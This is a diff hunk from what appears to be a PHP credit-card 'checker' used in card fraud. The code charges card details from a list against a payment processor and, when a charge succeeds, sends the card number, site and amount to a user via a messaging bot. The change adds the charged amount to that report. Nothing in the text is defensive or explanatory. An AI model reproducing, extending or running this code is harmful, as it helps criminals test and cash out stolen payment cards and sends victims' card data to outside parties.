@@ -167,7 +167,7 @@ curl_close($ch);
  $dcode2 = Getstr($result2,'"code": "','"');
 #############SUCCEEDED SUCCESS
  if (strpos($result1, '"status": "succeeded"')) {
-    echo "<font color=green><b>#CHARGED $lista<br>Payment completed ➔ BY STAR✘ » $success<br>";send_message($userid, "<b>𝗛𝗜𝗧 𝗦𝗘𝗡𝗗𝗘𝗥 ♻️\nCC :</b> <code>$lista</code>\n<b>RESULT : PAYMENT DONE ✅</b>\n<b>SITE :</b> <code>$success</code>\n<b>𝗕𝗬 ➔ 𝙎𝙏𝘼𝙍✘</b>");
+    echo "<font color=green><b>#CHARGED $lista<br>Payment completed ➔ BY STAR✘ » $success<br>";send_message($userid, "<b>𝗛𝗜𝗧 𝗦𝗘𝗡𝗗𝗘𝗥 ♻️\nCC :</b> <code>$lista</code>\n<b>RESULT : PAYMENT DONE ✅</b>\n<b>SITE :</b> <code>$success</code>\n<b>AMOUNT :</b> <code>$xamount</code>\n<b>𝗕𝗬 ➔ 𝙎𝙏𝘼𝙍✘</b>");
     exit();
 	         
 }
